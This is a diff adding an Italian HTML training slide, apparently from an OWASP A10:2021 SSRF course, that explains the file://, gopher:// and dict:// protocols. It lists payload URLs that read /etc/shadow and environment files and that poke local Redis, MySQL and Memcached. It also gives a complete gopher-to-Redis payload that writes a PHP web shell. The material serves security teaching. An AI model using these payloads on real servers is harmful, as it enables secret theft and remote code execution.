@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP A10:2021 - Esercizio 5: Protocolli Pericolosi</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">📡 Esercizio 5: Protocolli Pericolosi</h1>
+        <div class="subtitle">Oltre HTTP – file://, gopher://, dict://</div>
+
+        <div class="grid-3-col">
+            <div class="card border-red">
+                <div class="card-title">📂 file://</div>
+                <div class="card-text">
+                    Leggi file locali dal server:
+                    <div class="code-box">file:///etc/passwd
+file:///etc/shadow
+file:///var/www/html/config.php
+file:///proc/self/environ
+file:///proc/self/cmdline</div>
+                    <br>
+                    <strong>Metodo:</strong> Seleziona <span class="tech-term">curl</span>
+                </div>
+            </div>
+
+            <div class="card border-purple">
+                <div class="card-title">🐿️ gopher://</div>
+                <div class="card-text">
+                    Invia dati raw a servizi:
+                    <div class="code-box">gopher://127.0.0.1:6379/
+_INFO
+
+gopher://127.0.0.1:6379/
+_SET%20key%20value
+
+gopher://127.0.0.1:3306/
+_[raw MySQL packet]</div>
+                    <br>
+                    <strong>Può interagire con Redis, MySQL, SMTP!</strong>
+                </div>
+            </div>
+
+            <div class="card border-blue">
+                <div class="card-title">📖 dict://</div>
+                <div class="card-text">
+                    Simile a gopher per alcuni servizi:
+                    <div class="code-box">dict://127.0.0.1:6379/INFO
+
+dict://127.0.0.1:11211/
+stats</div>
+                    <br>
+                    <strong>Utile per:</strong> Redis, Memcached
+                </div>
+            </div>
+        </div>
+
+        <div class="card border-yellow" style="margin-top: 25px;">
+            <div class="card-title">🔥 Gopher + Redis = RCE</div>
+            <div class="card-text">
+                Con <span class="tech-term">gopher://</span> puoi inviare comandi Redis per scrivere una web shell:
+                <div class="code-box">gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0d%0aSAVE</div>
+                <br>
+                Questo scrive una shell PHP in <span class="tech-term">/var/www/html/shell.php</span>!
+            </div>
+        </div>
+
+        <div class="card border-green" style="margin-top: 20px;">
+            <div class="card-title">💡 Nota</div>
+            <div class="card-text">
+                Non tutti i metodi di fetch supportano questi protocolli. <span class="tech-term">cURL</span> 
+                supporta file://, gopher://, dict://. <span class="tech-term">file_get_contents()</span> 
+                supporta file:// ma non gopher://.
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 7;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
